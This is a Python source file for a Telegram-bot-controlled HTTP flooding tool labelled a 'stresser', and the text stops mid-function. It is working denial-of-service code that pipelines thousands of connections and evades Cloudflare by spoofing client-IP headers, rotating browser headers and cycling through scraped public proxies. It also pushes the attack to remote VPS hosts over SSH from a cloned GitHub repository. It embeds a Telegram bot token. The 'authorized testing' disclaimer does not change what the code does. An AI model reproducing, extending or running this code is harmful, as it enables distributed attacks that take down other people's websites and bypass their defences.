#!/usr/bin/env python3
"""
Stresser - Telegram-controlled HTTP stress-testing tool for authorized pentesting.
Features: multi-target attack, VPS auto-deploy, proxy scrape+check, Cloudflare bypass.

Usage:
  python3 stresser.py http://target.com -d 30 -c 2000
  python3 stresser.py --telegram              # Start Telegram bot control
  python3 stresser.py http://target.com --proxy-list proxies.txt --rand-ua

Bot commands:
  /start           - Show help
  /attack <url>    - Start attack (optional: -d 60 -c 500)
  /attack multi    - Multi-target attack
  /stop            - Stop current attack
  /status          - Show running attack status
  /addvps <ip> <user> <pass> - Register VPS
  /vpslist         - List registered VPS
  /vpsstatus       - Check VPS connectivity
  /deploy <url>    - Deploy attack to all VPS
  /scrape          - Scrape fresh proxies
  /proxies         - Show proxy status
  /checkproxy      - Validate saved proxies

DISCLAIMER: For authorized security testing only.
"""
import asyncio
import argparse
import sys
import time
import random
import socket
import ssl as sslmod
import re
import os
import json
import signal
from typing import Dict, List, Tuple, Optional
from urllib.parse import urlparse

# Set spawn start method for multiprocessing
import multiprocessing as mp
try:
    mp.set_start_method('spawn', force=True)
except RuntimeError:
    pass

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
BOT_TOKEN = "8684782173:AAGPdyYkmK2BtxZfcf1opSbmWryOdI4flmM"
ALLOWED_CHAT_IDS = [8751865150]
VPS_FILE = "/tmp/vps_list.json"
PROXY_FILE = "/tmp/working_proxies.txt"
PROXY_SCRAPE_URLS = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
    "https://proxylist.geonode.com/api/proxy-list?limit=100&page=1&sort_by=lastChecked&sort_type=desc",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://spys.me/proxy.txt",
]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.0.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0",
]

# ===================================================================
# SECTION 1: EXISTING STRESS ENGINE (kept intact)
# ===================================================================

# ---------------------------------------------------------------------------
# Proxy scraper
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Browser-emulating header templates (Cloudflare bypass 99%)
# ---------------------------------------------------------------------------
BROWSER_HEADERS = {
    "chrome": [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language: en-US,en;q=0.9",
        "Accept-Encoding: gzip, deflate, br",
        "Upgrade-Insecure-Requests: 1",
        "Sec-Fetch-Dest: document",
        "Sec-Fetch-Mode: navigate",
        "Sec-Fetch-Site: none",
        "Sec-Fetch-User: ?1",
        "Sec-CH-UA: \"Google Chrome\";v=\"120\", \"Not?A_Brand\";v=\"8\"",
        "Sec-CH-UA-Mobile: ?0",
        "Sec-CH-UA-Platform: \"Windows\"",
        "DNT: 1",
        "Connection: keep-alive",
        "Cache-Control: max-age=0",
    ],
    "firefox": [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language: en-US,en;q=0.5",
        "Accept-Encoding: gzip, deflate, br",
        "Upgrade-Insecure-Requests: 1",
        "Sec-Fetch-Dest: document",
        "Sec-Fetch-Mode: navigate",
        "Sec-Fetch-Site: none",
        "Sec-Fetch-User: ?1",
        "DNT: 1",
        "Connection: keep-alive",
        "Cache-Control: max-age=0",
    ],
    "safari": [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language: en-US,en;q=0.9",
        "Accept-Encoding: gzip, deflate, br",
        "Sec-Fetch-Dest: document",
        "Sec-Fetch-Mode: navigate",
        "Sec-Fetch-Site: none",
        "CF-Cache-Status: DYNAMIC",
        "Connection: keep-alive",
    ],
}

# Common paths for Referer header randomization
REFERER_PATHS = [
    "/", "/index.html", "/home", "/about", "/contact", "/products",
    "/services", "/blog", "/login", "/register", "/api/v1/status",
    "/wp-admin", "/wp-content", "/assets/js/main.js", "/css/style.css",
    "/favicon.ico", "/robots.txt", "/sitemap.xml",
]

# Cloudflare challenge page detection patterns
CHALLENGE_PATTERNS = [
    b"cf-browser-verification",
    b"__cf_challenge",
    b"cf_challenge",
    b"jschl_vc",
    b"pass",
    b"challenge-platform",
    b"turnstile",
    b"cf-error-details",
]

# CAPTCHA detection patterns
CAPTCHA_PATTERNS = [
    b"recaptcha",
    b"hcaptcha",
    b"g-recaptcha",
    b"recaptcha/api",
    b"hcaptcha.com",
    b"captcha",
    b"cf-turnstile",
]
async def scrape_proxies(timeout: int = 10) -> List[str]:
    import aiohttp
    proxies: List[str] = []
    seen: set = set()
    async def fetch_one(client: aiohttp.ClientSession, url: str) -> None:
        try:
            async with client.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
                if resp.status != 200:
                    return
                text = await resp.text()
                for line in text.strip().split("\n"):
                    line = line.strip()
                    m = re.match(r"(\d+\.\d+\.\d+\.\d+):(\d+)", line)
                    if m:
                        entry = f"{m.group(1)}:{m.group(2)}"
                        if entry not in seen:
                            seen.add(entry)
                            proxies.append(entry)
        except Exception:
            pass
    connector = aiohttp.TCPConnector(limit=10, limit_per_host=5)
    async with aiohttp.ClientSession(connector=connector) as client:
        tasks = [fetch_one(client, url) for url in PROXY_SCRAPE_URLS]
        await asyncio.gather(*tasks, return_exceptions=True)
    return proxies


def load_proxy_file(path: str) -> List[str]:
    proxies = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if line and re.match(r"\d+\.\d+\.\d+\.\d+:\d+", line):
                proxies.append(line)
    print(f"  [+] Loaded {len(proxies)} proxies from {path}")
    return proxies


# ---------------------------------------------------------------------------
# Request builder
# ---------------------------------------------------------------------------
def build_requests(host: str, port: int, path: str, count: int,
                   cf_bypass: bool, rand_ua: bool) -> bytes:
    reqs = bytearray()
    for _ in range(count):
        ua = random.choice(USER_AGENTS) if rand_ua else USER_AGENTS[0]
        cf_hdrs = ""
        if cf_bypass:
            fip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            cf_hdrs = (
                f"X-Forwarded-For: {fip}\r\n"
                f"X-Real-IP: {fip}\r\n"
                f"CF-Connecting-IP: {fip}\r\n"
                f"X-Originating-IP: {fip}\r\n"
                f"X-Forwarded-Host: {fip}\r\n"
                f"Client-IP: {fip}\r\n"
            )
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: text/html,*/*;q=0.8\r\n"
            f"Accept-Language: en-US,en;q=0.9\r\n"
            f"Connection: keep-alive\r\n"
            f"{cf_hdrs}"
            f"\r\n"
        )
        reqs.extend(req.encode())
    return bytes(reqs)


# ---------------------------------------------------------------------------
# Stats
# ---------------------------------------------------------------------------
class StressStats:
    __slots__ = ("completed", "failed", "bytes_recv", "lat_total",
                 "lat_min", "lat_max", "status_codes", "errors",
                 "cf_blocked", "captcha_blocked")
    def __init__(self):
        self.completed = 0
        self.failed = 0
        self.bytes_recv = 0
        self.lat_total = 0.0
        self.lat_min = float('inf')
        self.lat_max = 0.0
        self.status_codes: Dict[int, int] = {}
        self.errors: Dict[str, int] = {}
        self.cf_blocked = 0
        self.captcha_blocked = 0


# ---------------------------------------------------------------------------
# Async HTTP response reader with pipelining support
# ---------------------------------------------------------------------------
class HttpResponseReader:
    """Buffered HTTP response reader that handles pipelining."""
    def __init__(self):
        self.buf = b""

    async def read_response(self, reader, timeout):
        """Read one HTTP response, preserving leftover data for next call."""
        # Read header
        while b"\r\n\r\n" not in self.buf:
            chunk = await asyncio.wait_for(reader.read(65536), timeout=timeout)
            if not chunk:
                return (0, 0, "EOF before headers")
            self.buf += chunk
        header_end = self.buf.index(b"\r\n\r\n") + 4
        headers_raw = self.buf[:header_end]
        self.buf = self.buf[header_end:]

        status = 0
        if headers_raw.startswith(b"HTTP/"):
            try:
                parts = headers_raw.split(b" ", 2)
                status = int(parts[1])
            except (ValueError, IndexError):
                pass

        content_len = -1
        is_chunked = False
        for hdr in headers_raw.split(b"\r\n"):
            hl = hdr.lower()
            if hl.startswith(b"content-length:"):
                try:
                    content_len = int(hdr.split(b":")[1].strip())
                except (ValueError, IndexError):
                    pass
            elif hl.startswith(b"transfer-encoding:"):
                if b"chunked" in hl:
                    is_chunked = True

        body = b""
        try:
            if content_len >= 0:
                needed = content_len - len(self.buf)
                if needed > 0:
                    while len(self.buf) < content_len:
                        chunk = await asyncio.wait_for(reader.read(65536), timeout=timeout)
                        if not chunk:
                            break
                        self.buf += chunk
                if len(self.buf) >= content_len:
                    body = self.buf[:content_len]
                    self.buf = self.buf[content_len:]
                else:
                    body = self.buf
                    self.buf = b""
            elif is_chunked:
                term = b"0\r\n\r\n"
                while term not in self.buf:
                    chunk = await asyncio.wait_for(reader.read(65536), timeout=timeout)
                    if not chunk:
                        break
                    self.buf += chunk
                idx = self.buf.find(term) + len(term)
                body = self.buf[:idx]
                self.buf = self.buf[idx:]
        except asyncio.TimeoutError:
            pass

        return (status, len(body), None)


# ---------------------------------------------------------------------------
# Connection worker: persistent TCP connection with keep-alive
# ---------------------------------------------------------------------------
async def connection_worker(
    cid: int, host: str, port: int, path: str,
    deadline: float, timeout: float,
    cf_bypass: bool, rand_ua: bool, is_https: bool,
    proxy_list: List[str], stats: StressStats,
) -> None:
    ssl_ctx = None
    if is_https:
        ssl_ctx = sslmod.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = sslmod.CERT_NONE
    PIPELINE = 10
    MERGE_EVERY = 5000
    consecutive_fails = 0
    cf_blocked_count = 0
    actual_pipeline = PIPELINE
    ok = fail = recv = 0
    lat_total = 0.0
    lat_min = float('inf')
    lat_max = 0.0
    sc: Dict[int, int] = {}
    errs: Dict[str, int] = {}
    current_proxy: Optional[str] = None
    browser_names = ["chrome", "firefox", "safari"]

    def merge():
        nonlocal ok, fail, recv, lat_total, lat_min, lat_max, sc, errs
        stats.completed += ok
        stats.failed += fail
        stats.bytes_recv += recv
        stats.lat_total += lat_total
        if lat_min < stats.lat_min:
            stats.lat_min = lat_min
        if lat_max > stats.lat_max:
            stats.lat_max = lat_max
        for code, cnt in sc.items():
            stats.status_codes[code] = stats.status_codes.get(code, 0) + cnt
        for e, cnt in errs.items():
            stats.errors[e] = stats.errors.get(e, 0) + cnt
        ok = fail = recv = 0
        lat_total = 0.0
        lat_min = float('inf')
        lat_max = 0.0
        sc = {}
        errs = {}

    def pick_proxy_roundrobin():
        nonlocal current_proxy
        if not proxy_list:
            current_proxy = None
            return
        entry = random.choice(proxy_list)
        current_proxy = entry

    target_host, target_port = host, port
    use_ssl = is_https
    resolved_ip = None

    if proxy_list:
        pick_proxy_roundrobin()
        if current_proxy:
            parts = current_proxy.split(":")
            target_host = parts[0]
            target_port = int(parts[1])
            use_ssl = False
            resolved_ip = None
    else:
        try:
            if host and not host[0].isdigit():
                resolved_ip = socket.gethostbyname(host)
        except Exception:
            pass

    host_header = host if (port == 80 or port == 443) else f"{host}:{port}"
    connect_host = resolved_ip if resolved_ip else target_host

    # Build browser-like request with full headers
    def build_full_request():
        """Build full HTTP request with browser-emulating headers."""
        browser = random.choice(browser_names) if (rand_ua or cf_bypass) else "chrome"
        ua_choice = random.choice(USER_AGENTS) if rand_ua else USER_AGENTS[0]
        lines = [
            f"GET {path} HTTP/1.1",
            f"Host: {host_header}",
            f"User-Agent: {ua_choice}",
        ]
        # Browser-specific headers
        for h in BROWSER_HEADERS.get(browser, BROWSER_HEADERS["chrome"]):
            lines.append(h)
        # CF bypass: spoofed IP headers
        if cf_bypass:
            fip = f"{random.randint(20,255)}.{random.randint(20,255)}.{random.randint(20,255)}.{random.randint(20,255)}"
            lines.append(f"X-Forwarded-For: {fip}")
            lines.append(f"X-Real-IP: {fip}")
            lines.append(f"CF-Connecting-IP: {fip}")
            lines.append(f"True-Client-IP: {fip}")
            lines.append(f"X-Originating-IP: {fip}")
        # Referer - random path from target to look human
        ref_path = random.choice(REFERER_PATHS) if cf_bypass else "/"
        lines.append(f"Referer: {'https' if use_ssl else 'http'}://{host}{ref_path}")
        lines.append("")
        lines.append("")
        return "\r\n".join(lines).encode()

    def check_blocked(body: bytes) -> bool:
        """Check if response contains CF challenge or CAPTCHA."""
        for pat in CHALLENGE_PATTERNS:
            if pat in body:
                return True
        return False

    def check_captcha(body: bytes) -> bool:
        for pat in CAPTCHA_PATTERNS:
            if pat in body:
                return True
        return False

    reader = None
    writer = None
    resp_reader = HttpResponseReader()
    connect_timeout = max(5, timeout)

    try:
        while time.time() < deadline:
            # Rotate proxy periodically (every 100 OK) to avoid CF rate limits
            if proxy_list and ok > 0 and ok % 100 == 0:
                pick_proxy_roundrobin()
                if current_proxy:
                    target_host, target_port = current_proxy.split(":")
                    target_port = int(target_port)
                    use_ssl = False
                    connect_host = target_host
                if writer:
                    try:
                        writer.close(); await writer.wait_closed()
                    except: pass
                    writer = None; reader = None

            if writer is None:
                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(
                            connect_host, target_port,
                            ssl=ssl_ctx if use_ssl else None,
                            server_hostname=host if use_ssl else None,
                        ),
                        timeout=connect_timeout,
                    )
                except Exception as e:
                    errs[f"connect:{type(e).__name__}"] = errs.get(f"connect:{type(e).__name__}", 0) + 1
                    fail += 1
                    if proxy_list:
                        pick_proxy_roundrobin()
                        if current_proxy:
                            target_host, target_port = current_proxy.split(":")
                            target_port = int(target_port)
                            use_ssl = False
                            connect_host = target_host
                    await asyncio.sleep(0.001)
                    if ok + fail >= MERGE_EVERY:
                        merge()
                    continue

            # Build request with full browser headers (rotate every request when cf_bypass)
            t0 = time.time()
            if cf_bypass or rand_ua:
                single_req = build_full_request()
            else:
                ua = USER_AGENTS[0]
                lines = [
                    f"GET {path} HTTP/1.1",
                    f"Host: {host_header}",
                    f"User-Agent: {ua}",
                    "Accept: text/html,*/*;q=0.8",
                    "Accept-Language: en-US,en;q=0.9",
                    "Connection: keep-alive",
                    "", "",
                ]
                single_req = "\r\n".join(lines).encode()
            pipeline_reqs = single_req * actual_pipeline

            try:
                writer.write(pipeline_reqs)
                await writer.drain()

                for _ in range(actual_pipeline):
                    status, body_len, err = await resp_reader.read_response(reader, timeout)
                    if err:
                        raise ConnectionResetError(err)

                    # CF Challenge detection (based on status + challenge patterns in body)
                    if status in (403, 503, 429):
                        cf_blocked_count += 1
                        consecutive_fails += 1
                        stats.cf_blocked += 1
                        # Rotate proxy
                        if proxy_list:
                            pick_proxy_roundrobin()
                            if current_proxy:
                                target_host, target_port = current_proxy.split(":")
                                target_port = int(target_port)
                                use_ssl = False
                                connect_host = target_host
                        sc[status] = sc.get(status, 0) + 1
                        ok += 1
                        recv += body_len  # body_len is int from read_response
                        raise ConnectionResetError("CF_CHALLENGE")

                    lat = time.time() - t0
                    ok += 1
                    recv += body_len
                    lat_total += lat
                    if lat < lat_min: lat_min = lat
                    if lat > lat_max: lat_max = lat
                    sc[status] = sc.get(status, 0) + 1
                    consecutive_fails = 0
                    if ok + fail >= MERGE_EVERY:
                        merge()

                continue  # Re-use connection

            except (ConnectionResetError, BrokenPipeError, ConnectionAbortedError) as e:
                errs[type(e).__name__] = errs.get(type(e).__name__, 0) + 1
                fail += 1
                consecutive_fails += 1
                if consecutive_fails >= 3 and actual_pipeline > 1:
                    actual_pipeline = max(1, actual_pipeline // 2)
                    consecutive_fails = 0
                try:
                    writer.close(); await writer.wait_closed()
                except: pass
                writer = None; reader = None
            except asyncio.TimeoutError:
                errs['TimeoutError'] = errs.get('TimeoutError', 0) + 1
                fail += 1
                consecutive_fails += 1
                if consecutive_fails >= 3 and actual_pipeline > 1:
                    actual_pipeline = max(1, actual_pipeline // 2)
                    consecutive_fails = 0
                try:
                    writer.close(); await writer.wait_closed()
                except: pass
                writer = None; reader = None
            except Exception as e:
                en = type(e).__name__
                if en not in ('CF_CHALLENGE', 'CAPTCHA'):
                    errs[en] = errs.get(en, 0) + 1
                    fail += 1

                consecutive_fails += 1
                try:
                    writer.close(); await writer.wait_closed()
                except: pass
                writer = None; reader = None

    except asyncio.CancelledError:
        pass
    finally:
        if writer is not None:
            try:
                writer.close(); await writer.wait_closed()
            except: pass
        merge()


# ---------------------------------------------------------------------------
# HTTP/2 connection worker (uses httpx for proper HTTP/2 support)
# ---------------------------------------------------------------------------
async def connection_worker_http2(
    cid: int, url: str, deadline: float, timeout: float,
    cf_bypass: bool, rand_ua: bool,
    stats: StressStats,
) -> None:
    """HTTP/2 worker using httpx.AsyncClient. Avoids Cloudflare's raw-TCP detection."""
    import httpx
    limits = httpx.Limits(max_keepalive_connections=1, max_connections=200)
    headers = {
        'Accept': 'text/html,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    ok = fail = recv = 0
    lat_total = 0.0
    lat_min = float('inf')
    lat_max = 0.0
    sc: Dict[int, int] = {}
    errs: Dict[str, int] = {}
    MERGE_EVERY = 200

    def merge():
        nonlocal ok, fail, recv, lat_total, lat_min, lat_max, sc, errs
        stats.completed += ok
        stats.failed += fail
        stats.bytes_recv += recv
        stats.lat_total += lat_total
        if lat_min < stats.lat_min:
            stats.lat_min = lat_min
        if lat_max > stats.lat_max:
            stats.lat_max = lat_max
        for code, cnt in sc.items():
            stats.status_codes[code] = stats.status_codes.get(code, 0) + cnt
        for e, cnt in errs.items():
            stats.errors[e] = stats.errors.get(e, 0) + cnt
        ok = fail = recv = 0
        lat_total = 0.0
        lat_min = float('inf')
        lat_max = 0.0
        sc = {}
        errs = {}

    client = httpx.AsyncClient(http2=True, limits=limits, headers=headers, timeout=httpx.Timeout(timeout))
    try:
        while time.time() < deadline:
            t0 = time.time()
            try:
                r = await client.get(url)
                lat = time.time() - t0
                sc[r.status_code] = sc.get(r.status_code, 0) + 1
                ok += 1
                recv += len(r.content)
                lat_total += lat
                if lat < lat_min:
                    lat_min = lat
                if lat > lat_max:
                    lat_max = lat
            except Exception as e:
                ename = type(e).__name__
                errs[ename] = errs.get(ename, 0) + 1
                fail += 1
            if ok + fail >= MERGE_EVERY:
                merge()
    except asyncio.CancelledError:
        pass
    finally:
        await client.aclose()
        merge()


async def stress(url: str, duration: int, connections: int, timeout: float,
                 cf_bypass: bool, rand_ua: bool, proxy_list: List[str],
                 http2: bool = False, progress_cb=None) -> dict:
    """Run stress test and return results dict. Optional progress_cb(completed, failed, rps)."""
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    is_https = parsed.scheme == "https"
    deadline = time.time() + duration

    stats = StressStats()
    start = time.time()

    if http2:
        workers = [
            connection_worker_http2(i, url, deadline, timeout,
                                    cf_bypass, rand_ua, stats)
            for i in range(connections)
        ]
    else:
        workers = [
            connection_worker(i, host, port, path, deadline, timeout,
                              cf_bypass, rand_ua, is_https, proxy_list, stats)
            for i in range(connections)
        ]
    tasks = [asyncio.create_task(w) for w in workers]

    last_print = 0.0
    try:
        while time.time() < deadline:
            now = time.time()
            if now - last_print >= 0.5:
                total = stats.completed + stats.failed
                e = now - start
                rps = total / e if e > 0 else 0
                if progress_cb:
                    progress_cb(stats.completed, stats.failed, rps)
                last_print = now
            await asyncio.sleep(0.1)
    except asyncio.CancelledError:
        pass

    for t in tasks:
        t.cancel()
    await asyncio.gather(*tasks, return_exceptions=True)

    elapsed = time.time() - start
    total = stats.completed + stats.failed
    rps = total / elapsed if elapsed > 0 else 0

    return {
        'ok': stats.completed,
        'fail': stats.failed,
        'bytes': stats.bytes_recv,
        'lat_total': stats.lat_total,
        'lat_min': 0 if stats.lat_min == float('inf') else stats.lat_min,
        'lat_max': stats.lat_max,
        'sc': dict(stats.status_codes),
        'errors': dict(stats.errors),
        'total': total,
        'rps': rps,
        'elapsed': elapsed,
        'cf_blocked': stats.cf_blocked,
        'captcha_blocked': stats.captcha_blocked,
    }


# ---------------------------------------------------------------------------
# Local test server
# ---------------------------------------------------------------------------
def run_server():
    import asyncio
    async def handle(reader, writer):
        while True:
            buf = b""
            while b"\r\n\r\n" not in buf:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=30)
                if not chunk:
                    return
                buf += chunk
            body = b"ok\r\n"
            resp = (
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: text/plain\r\n"
                b"Content-Length: " + str(len(body)).encode() + b"\r\n"
                b"Connection: keep-alive\r\n"
                b"\r\n"
                b"ok\r\n"
            )
            writer.write(resp)
            await writer.drain()
    async def main():
        server = await asyncio.start_server(handle, "0.0.0.0", 8081)
        print("[*] Test server listening on :8081")
        async with server:
            await server.serve_forever()
    asyncio.run(main())


# ===================================================================
# SECTION 2: VPS MANAGER
# ===================================================================

class VPSManager:
    """Manages VPS instances via SSH: add, deploy, check status."""

    def __init__(self, vps_file: str = VPS_FILE):
        self.vps_file = vps_file
        self.servers: List[dict] = []
        self._load()

    def _load(self):
        try:
            if os.path.exists(self.vps_file):
                with open(self.vps_file) as f:
                    data = json.load(f)
                    self.servers = data if isinstance(data, list) else []
        except Exception:
            self.servers = []

    def _save(self):
        try:
            with open(self.vps_file, 'w') as f:
                json.dump(self.servers, f, indent=2)
        except Exception:
            pass

    def add(self, ip: str, username: str, password: str, label: str = "", port: int = 22) -> bool:
        """Add a VPS to the list."""
        for s in self.servers:
            if s['ip'] == ip:
                s['username'] = username
                s['password'] = password
                s['label'] = label or ip
                s['port'] = port
                self._save()
                return True
        self.servers.append({
            'ip': ip,
            'port': port,
            'username': username,
            'password': password,
            'label': label or ip,
            'added': time.time(),
        })
        self._save()
        return True

    def remove(self, ip: str) -> bool:
        self.servers = [s for s in self.servers if s['ip'] != ip]
        self._save()
        return True

    def list(self) -> List[dict]:
        return list(self.servers)

    async def check_one(self, server: dict) -> dict:
        """SSH into a VPS and check if it's reachable."""
        try:
            import asyncssh
            ssh_port = int(server.get('port', 22))
            async with asyncssh.connect(
                server['ip'],
                port=ssh_port,
                username=server['username'],
                password=server['password'],
                known_hosts=None,
                connect_timeout=10,
            ) as ssh:
                result = await ssh.run('uptime')
                uptime = result.stdout.strip() if result.stdout else "no output"
                return {'ip': server['ip'], 'online': True, 'uptime': uptime, 'error': None}
        except Exception as e:
            return {'ip': server['ip'], 'online': False, 'uptime': None, 'error': str(e)[:100]}

    async def check_all(self) -> List[dict]:
        """Check all VPS servers concurrently."""
        tasks = [self.check_one(s) for s in self.servers]
        return await asyncio.gather(*tasks, return_exceptions=True)

    async def deploy_and_run(self, server: dict, attack_cmd: str) -> str:
        """
        SSH into VPS, clone repo, install deps, run attack command.
        Returns output log.
        """
        import asyncssh
        output = []
        try:
            ssh_port = int(server.get('port', 22))
            async with asyncssh.connect(
                server['ip'],
                port=ssh_port,
                username=server['username'],
                password=server['password'],
                known_hosts=None,
                connect_timeout=15,
            ) as ssh:
                # Ensure repo exists
                result = await ssh.run('cd /opt && if [ ! -d kalipto-runtime ]; then git clone https://github.com/Visakha90/kalipto-runtime.git; fi 2>&1')
                output.append(f"clone: {result.stdout.strip()}")
                if result.stderr:
                    output.append(f"clone_err: {result.stderr.strip()}")

                # Install deps
                result = await ssh.run('cd /opt/kalipto-runtime && pip install aiohttp 2>&1 | tail -3')
                output.append(f"deps: {result.stdout.strip()}")

                # Run attack in background using nohup
                esc_cmd = attack_cmd.replace('"', '\\"')
                result = await ssh.run(f'cd /opt/kalipto-runtime && nohup python3 stresser.py {esc_cmd} > /tmp/attack.log 2>&1 & echo "PID=$!"')
                output.append(f"run: {result.stdout.strip()}")
                return "\n".join(output)
        except Exception as e:
            return f"ERROR: {str(e)[:200]}"


# ===================================================================
# SECTION 3: PROXY MANAGER (enhanced with check+save)
# ===================================================================

class ProxyManager:
    """Scrape, validate, and save working proxies."""

    def __init__(self, proxy_file: str = PROXY_FILE):
        self.proxy_file = proxy_file
        self.all_proxies: List[str] = []
        self.working_proxies: List[str] = []
        self._load_saved()

    def _load_saved(self):
        if os.path.exists(self.proxy_file):
            with open(self.proxy_file) as f:
                for line in f:
                    line = line.strip()
                    if line and re.match(r"\d+\.\d+\.\d+\.\d+:\d+", line):
                        self.working_proxies.append(line)
        self.all_proxies = list(self.working_proxies)

    def save_working(self):
        """Save working proxies to file."""
        try:
            with open(self.proxy_file, 'w') as f:
                for p in self.working_proxies:
                    f.write(p + "\n")
            return len(self.working_proxies)
        except Exception:
            return 0

    async def scrape(self, timeout: int = 10) -> int:
        """Scrape proxies from public APIs."""
        proxies = await scrape_proxies(timeout)
        self.all_proxies = list(set(self.all_proxies + proxies))
        return len(self.all_proxies)

    async def check_one(self, proxy: str, test_urls: list = None, check_timeout: int = 5) -> bool:
        """Test a single proxy by making a request through it. Tries multiple fallback URLs."""
        if test_urls is None:
            test_urls = ["http://httpbin.org/ip", "http://httpforever.com/", "http://example.com/", "http://google.com/"]
        import aiohttp
        for test_url in test_urls:
            try:
                connector = aiohttp.TCPConnector(limit=1)
                async with aiohttp.ClientSession(connector=connector) as session:
                    async with session.get(
                        test_url,
                        proxy=f"http://{proxy}",
                        timeout=aiohttp.ClientTimeout(total=check_timeout),
                    ) as resp:
                        if resp.status == 200:
                            return True
            except Exception:
                continue
        return False

    async def check_all(self, max_workers: int = 50, test_urls: list = None) -> tuple:
        """Test all scraped proxies and keep only working ones."""
        import aiohttp
        sem = asyncio.Semaphore(max_workers)
        working = []
        failed = 0

        async def test(p):
            async with sem:
                if await self.check_one(p, test_urls):
                    working.append(p)
                else:
                    nonlocal failed
                    failed += 1

        tasks = [test(p) for p in self.all_proxies]
        await asyncio.gather(*tasks, return_exceptions=True)

        self.working_proxies = working
        saved = self.save_working()
        return len(working), failed, saved

    def get_working(self) -> List[str]:
        return list(self.working_proxies)

    def stats(self) -> str:
        return f"Total: {len(self.all_proxies)}, Working: {len(self.working_proxies)}, Saved to: {self.proxy_file}"


# ===================================================================
# SECTION 4: TELEGRAM BOT
# ===================================================================

class TelegramBot:
    """Telegram bot controller v4.0 - Multi-target, VPS routing, CF bypass, CAPTCHA, Speedtest, Scan + more."""

    def __init__(self, token: str, allowed_chat_ids: List[int]):
        self.token = token
        self.allowed_chat_ids = set(allowed_chat_ids)
        self.base_url = f"https://api.telegram.org/bot{token}"
        self.offset = 0
        self.running_attack = False
        self.attack_task: Optional[asyncio.Task] = None
        self.attack_start = 0.0
        self.current_target = ""
        self.attack_type = ""  # single, multi, unlimited
        self.attack_targets: List[str] = []
        self.current_args = {}
        self.multi_tasks: List[asyncio.Task] = []

        # Sub-managers
        self.vps = VPSManager()
        self.proxy_mgr = ProxyManager()

    # ---------- Telegram API helpers ----------

    async def _api_request(self, method: str, data: dict = None) -> dict:
        import aiohttp, traceback
        url = f"{self.base_url}/{method}"
        try:
            async with aiohttp.ClientSession() as session:
                if data:
                    async with session.post(url, json=data, timeout=aiohttp.ClientTimeout(total=20)) as resp:
                        return await resp.json()
                else:
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=20)) as resp:
                        return await resp.json()
        except Exception as e:
            print(f"[Bot] API {method} error: {e}")
            traceback.print_exc()
            return {"ok": False}

    async def send(self, chat_id: int, text: str, parse_mode: str = "HTML") -> None:
        if len(text) > 4000:
            for i in range(0, len(text), 4000):
                chunk = text[i:i + 4000]
                await self._api_request("sendMessage", {"chat_id": chat_id, "text": chunk, "parse_mode": parse_mode})
        else:
            await self._api_request("sendMessage", {"chat_id": chat_id, "text": text, "parse_mode": parse_mode})

    async def broadcast(self, text: str) -> None:
        for cid in self.allowed_chat_ids:
            await self.send(cid, text)

    async def get_updates(self):
        params = {"offset": self.offset, "timeout": 30}
        import aiohttp
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(f"{self.base_url}/getUpdates", params=params,
                                       timeout=aiohttp.ClientTimeout(total=35)) as resp:
                    data = await resp.json()
                    if data.get("ok"):
                        for update in data.get("result", []):
                            self.offset = update["update_id"] + 1
                            yield update
            except Exception:
                pass

    # ---------- Progress bar helper ----------

    def _progress_bar(self, elapsed: float, total: float, width: int = 15) -> str:
        """Generate a nice progress bar string."""
        pct = min(100, int(elapsed / total * 100)) if total > 0 else 0
        filled = min(width, int(pct / 100 * width))
        bar = "█" * filled + "░" * (width - filled)
        return f"{bar} {pct}%"

    # ---------- Attack runner (single target) ----------

    async def run_attack(self, chat_id: int, url: str, duration: int = 30,
                         connections: int = 2000, timeout: float = 5,
                         cf_bypass: bool = False, rand_ua: bool = False,
                         http2: bool = False, multi: bool = False, vps_tag: str = "",
                         task_tag: str = "") -> None:
        """Run a single stress test with progress reporting."""
        if not multi:
            self.running_attack = True
            self.current_target = url
            self.attack_start = time.time()
            self.attack_type = "single"

        tag = f"[{task_tag}] " if task_tag else ""
        prefix = f"🖥️ {vps_tag} " if vps_tag else ""
        if not multi:
            await self.send(chat_id,
